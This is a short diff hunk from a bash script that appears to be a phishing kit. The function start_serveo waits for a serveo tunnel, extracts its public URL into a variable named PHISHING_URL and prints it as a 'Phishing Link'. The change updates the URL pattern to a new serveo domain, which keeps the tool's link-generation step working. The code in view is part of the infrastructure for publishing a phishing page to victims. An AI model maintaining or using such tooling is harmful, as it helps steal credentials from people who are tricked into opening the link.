@@ -212,7 +212,7 @@ start_serveo() {
     for i in {1..10}; do
         sleep 2
         if grep -q "Forwarding HTTP traffic" serveo.txt 2>/dev/null; then
-            PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveo.net" serveo.txt | head -1)
+            PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveousercontent.com" serveo.txt | head -1)
             if [[ ! -z "$PHISHING_URL" ]]; then
                 echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
                 return
